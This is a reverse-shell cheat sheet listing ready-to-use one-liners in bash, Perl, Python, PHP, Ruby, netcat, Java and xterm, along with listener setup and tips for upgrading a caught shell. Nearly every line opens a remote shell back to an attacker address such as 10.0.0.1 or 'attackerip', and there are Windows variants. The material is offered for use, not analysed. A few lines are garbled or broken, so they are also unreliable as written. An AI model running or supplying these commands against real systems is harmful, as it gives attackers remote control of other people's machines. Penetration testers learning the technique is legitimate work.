Bash  
Some versions of bash can send you a reverse shell (this was tested on Ubuntu 10.10):  
  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  
PERL  
Here’s a shorter, feature-free version of the perl-reverse-shell:  
  
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'  
There’s also an alternative PERL revere shell here.  
  
Python  
This was tested under Linux / Python 2.7:  
  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
PHP  
This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…  
  
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'  
If you want a .php file to upload, see the more featureful and robust php-reverse-shell.  
  
Ruby  
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
Netcat  
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.  
  
nc -e /bin/sh 10.0.0.1 1234  
If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:  
  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f  
Java  
r = Runtime.getRuntime()  
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
p.waitFor()  
[Untested submission from anonymous reader]  
  
xterm  
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.  
  
xterm -display 10.0.0.1:1  
To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):  
  
Xnest :1  
You’ll need to authorise the target to connect to you (command also run on your host):  
  
xhost +targetip  
  
# path to reverse shells on kali linux  
/usr/share/webshell/php  
  
# create reverse shell  
# nc: listening host  
nc -lvp 4444  
# nc: Linux reverse shell  
nc 10.0.0.1 1234 -e /bin/sh  
  
# nc: Windows reverse shell  
nc 10.0.0.1 1234 -e cmd.exe  
  
# nc: Netcat workaround when -e option not possible  
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f  
  
# nc: target machine (windows)  
nc -nv ipAddress 4444 -e cmd.exe  
  
# nc: target machine (unix)  
nc -nv ipAddress 4444 -e /bin/sh  
  
# python: upgrade a netcat shell                                                             
python -c 'import pty; pty.spawn("/bin/bash")'  
  
# move the reverse shell into the background  
<Ctrl-Z>  
  
# move the reverse shell into the foreground  
fg <enter><enter>  
  
# perl: shell  
perl -e 'use Socket; $i="10.0.0.1"; $p=1234; socket(S,PF_INET, SOCK_STREAM, getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))) { open(STDIN,">&S") ; open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh - i");};'  
  
# perl: Perl without /bin/sh  
perl -MIO -e '$p=fork;exit,if($p);$c=new  
IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~-fdopen($c,w) ;system $_i while<>;'  
  
# perl: Windows  
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w) ; system$_while<>;'  
  
# python  
python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("10.0.0.1", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);  
p=subprocess.call(["/bin/sh","-i]);'  
  
# Bash  
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1  
  
# Java  
r = Runtime.getRuntime()  
p = r.exec( ["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])  
p.waitFor()  
  
# PHP  
php -r '$sock=fsockopen("10.0.0.1", 1234) ; exec("/bin/sh -i <&3 >&3 2>&3");'  
  
# Ruby  
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
  
# Ruby without /bin/sh  
by -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd, "r"){|io|c.print io.read} end'  
  
# Ruby for Windows  
ruby -rsocket -e  
'c=TCPSocket.new("attackerIp","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'